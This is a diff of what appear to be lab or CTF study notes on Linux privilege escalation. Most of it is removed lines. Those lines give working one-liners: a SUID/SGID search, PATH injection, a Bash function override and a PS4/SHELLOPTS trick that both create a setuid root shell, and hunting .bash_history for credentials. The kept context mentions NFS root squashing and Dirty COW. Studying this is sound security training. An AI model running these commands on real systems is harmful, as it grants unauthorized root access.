@@ -64,33 +64,6 @@ Since we know our victim machine is running Windows Defender, let's go ahead and
 
 ## Privilege escalation
 
-* SGID `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
-* SUID - shared
-
-Run strace on the file and search the output for open/access calls and for "no such file" errors:
-
-strace xxx.so 2>&1 | grep -iE "open|access|no such file"
-
-* we can see the trace of the program. We can look if the program tried to open files that we can write.
-* .so (a c program compiled as shared)
-* if you try to read a .so, you won't understand much aside some character that were not "changed". You can see these characters with `strings xxx.so`
-* Can inject env variables: PATH=.:$PATH ./xxx.so
-
-n Bash versions <4.2-048, possible create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved).
-
-function /usr/sbin/service { /bin/bash -p; }
-export -f /usr/sbin/service
-
-Bash <4.4 enable debug, inject code in the PS4 env variable
-env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' _shared object that the user can run_
-
-.bash_history
-=> look for mysql, su, sudo...
-
-ssh -i root_key (chmod 600)
-
----
-
 Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
 
 Check the NFS share configuration on the Debian VM:
@@ -106,10 +79,3 @@ Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on 
 perl linux-exploit-suggester-2.pl
 
 Linux kernel exploit "Dirty COW"
-
-----
-
-sudo -nS -l
-sudo -S id
-
-ssh2john
